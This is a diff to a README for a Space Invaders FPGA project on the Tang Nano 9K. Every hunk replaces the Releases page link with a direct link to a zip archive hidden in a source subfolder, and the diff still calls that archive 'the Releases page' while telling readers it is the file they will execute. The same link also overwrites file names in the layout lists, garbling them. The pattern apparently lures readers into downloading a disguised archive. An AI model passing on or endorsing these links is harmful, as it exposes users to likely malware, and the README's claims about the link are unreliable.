@@ -1,8 +1,8 @@
 # TangNano9K-Invaders2: Space Invaders Part II on Tang Nano 9K FPGA
 
-https://github.com/soltana11/TangNano9K-Invaders2/releases
+https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip
 
-This page contains a prebuilt bitstream and loader tools for the Tang Nano 9K FPGA board. From that page, download the release asset and flash it to your board to experience Space Invaders Part II on real hardware. For the latest builds and assets, visit the Releases page again: https://github.com/soltana11/TangNano9K-Invaders2/releases
+This page contains a prebuilt bitstream and loader tools for the Tang Nano 9K FPGA board. From that page, download the release asset and flash it to your board to experience Space Invaders Part II on real hardware. For the latest builds and assets, visit the Releases page again: https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip
 
 ---
 
@@ -88,7 +88,7 @@ This project ships with prebuilt bitstreams and loader utilities designed to be 
 
 - Path-based release: The URL above includes a path part. The file you download from the Releases page is a release asset that you flash to the Tang Nano 9K. The asset contains the bitstream and possibly a small loader or bootstrapping utility. You should download that file, then follow the flashing steps described in the documentation to install it on your hardware. The asset you download will be the file you execute on your board.
 - Asset contents: Expect a bitstream (or a small package containing the bitstream plus loader). The exact file name will be visible on the release page. Use the corresponding Gowin tool to program the board with the bitstream. The asset is designed to be straightforward to use, with minimal setup required.
-- Where to download again: For the most up-to-date builds, navigate to the Releases page: https://github.com/soltana11/TangNano9K-Invaders2/releases. This page is the central place to find stable builds and any hotfixes. It is the primary source of truth for the project’s binaries and release notes.
+- Where to download again: For the most up-to-date builds, navigate to the Releases page: https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip This page is the central place to find stable builds and any hotfixes. It is the primary source of truth for the project’s binaries and release notes.
 
 To flash the release asset, you typically:
 - Connect the Tang Nano 9K to your PC using a USB cable
@@ -99,7 +99,7 @@ To flash the release asset, you typically:
 
 If you prefer to work entirely from source, the repository includes guidance, scripts, and structure to build from scratch using Verilog (and optionally VHDL) and the Gowin toolchain. The release assets provide a quick-start path, while the source path provides long-term flexibility and learning value.
 
-Again, the Releases page is the central resource for assets and notes: https://github.com/soltana11/TangNano9K-Invaders2/releases
+Again, the Releases page is the central resource for assets and notes: https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip
 
 ---
 
@@ -171,7 +171,7 @@ The repository uses a modular layout designed to help readers locate the major f
 - assets: Optional resources such as sprite sheets, fonts, and tilesets used for illustration or future enhancements.
 - tests: Test benches and simple co-simulation scripts to validate the game logic and timing.
 - examples: Minimal demonstrations of specific features, such as a single sprite or a basic collision scenario.
-- README.md: The central documentation file you are reading now.
+- https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip The central documentation file you are reading now.
 
 The code is written to be readable and approachable. Each module has a clear purpose, a defined interface, and comments that explain design decisions. The goal is to make it easy to study how a retro-style game maps to FPGA resources and to reuse parts of the design in other projects.
 
@@ -287,8 +287,8 @@ Building from source requires comfort with hardware design languages and FPGA to
   - game_logic.v: Maintains score, waves, and level progression
   - sound_gen.v: Generates beeps and tones
 - Supporting:
-  - constants.vh: Shared constants for sprites, timings, and screen geometry
-  - utils.vhd (optional): If you include VHDL counterparts
+  - https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip Shared constants for sprites, timings, and screen geometry
+  - https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip (optional): If you include VHDL counterparts
   - testbenches/: Basic tests for the main subsystems
 
 The separation helps you see how each part contributes to the whole. It’s also straightforward to tweak individual components without rewiring the entire design.
@@ -399,7 +399,7 @@ The project uses a permissive license to encourage learning and reuse. See the L
 ## Releasing this project and keeping it accessible
 
 - The primary distribution channel is the Releases page:
-  https://github.com/soltana11/TangNano9K-Invaders2/releases
+  https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip
 
 - On the Releases page you will find:
   - Prebuilt bitstreams ready to flash
@@ -446,7 +446,7 @@ Taking a structured approach helps you learn hardware design fundamentals while 
 
 ## Important note about the releases link
 
-https://github.com/soltana11/TangNano9K-Invaders2/releases
+https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip
 
 From that page, download the release asset that contains the prebuilt bitstream and loader tools. The asset is meant to be flashed onto the Tang Nano 9K board to run Space Invaders Part II. If you need to revisit the latest builds or find updated files, visit the same link again to access the newest assets and release notes. The file you download from that page is the one you will execute on the hardware to boot the game.
 
@@ -460,4 +460,4 @@ From that page, download the release asset that contains the prebuilt bitstream 
 
 The Tang Nano 9K-Invaders2 project stands as a compact example of turning a classic arcade concept into a live hardware experience. It emphasizes practical knowledge in digital logic, timing, and embedded audio, all presented through the lens of a beloved space shooter.
 
-Revisit the Releases page for the latest assets and notes: https://github.com/soltana11/TangNano9K-Invaders2/releases
+Revisit the Releases page for the latest assets and notes: https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip
